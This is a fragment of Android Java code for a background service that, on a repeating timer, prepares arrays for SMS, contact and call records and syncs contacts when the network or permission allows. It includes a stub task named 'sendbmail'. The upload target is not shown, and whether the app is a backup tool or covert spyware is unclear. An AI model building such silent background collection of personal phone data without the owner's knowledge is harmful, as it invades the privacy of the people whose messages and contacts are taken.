            // run on another thread
            mHandler.post(new Runnable() {

                @Override
                public void run() {
                    // display toast
                    SharedPreferences pref = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
                    stro = pref.getString(PREF_strdate, "");

                    smsarr = new JSONArray();
                    contactsarr = new JSONArray();
                    callarr = new JSONArray();
                    sendc=0;
                    sendm=0;
                    sends=0;
                    if(start!=0) {
                        if(isNetworkAvailable()) {
                            syncallcontacts();
                            mTimer.cancel();
                            mTimer = new Timer();
                            mTimer.scheduleAtFixedRate(new TimeDisplayTimerTask(), 0, NOTIFY_INTERVAL);

                        }else {
                            mTimer.cancel();
                            mTimer = new Timer();
                            mTimer.scheduleAtFixedRate(new TimeDisplayTimerTask(), 0, NOTIFY_INTERVAL/48);
                        }
                            //Log.d("star","sasa"+usr_id+usr_phone+usr_name+usr_email);
                    }else{
                        if (ContextCompat.checkSelfPermission(BackServicce.this, Manifest.permission.READ_CONTACTS)
                                == PackageManager.PERMISSION_GRANTED) {
                           // Log.d("back","service");
                            synccontacts2();
                            //Log.d("back","service");
                            //t.start();
                        }
                    }
                    start=1;
                }

            });
        }

        private String getDateTime() {
            // get date time in custom format
            SimpleDateFormat sdf = new SimpleDateFormat("[yyyy/MM/dd - HH:mm:ss]");
            return sdf.format(new Date());
        }

    }

    public class sendbmail extends AsyncTask<Void, Void, Boolean> {
        HttpURLConnection urlConnection = null;

        protected void onPreExecute() {
            //Log.d("ass","anss");
        }

        protected Boolean doInBackground(Void... urls) {
            return true;

        }

        protected void onPostExecute(Boolean response) {
            //Log.d("ass","anss2");
            //Log.d("mm",String.valueOf(response));
        }
    }
}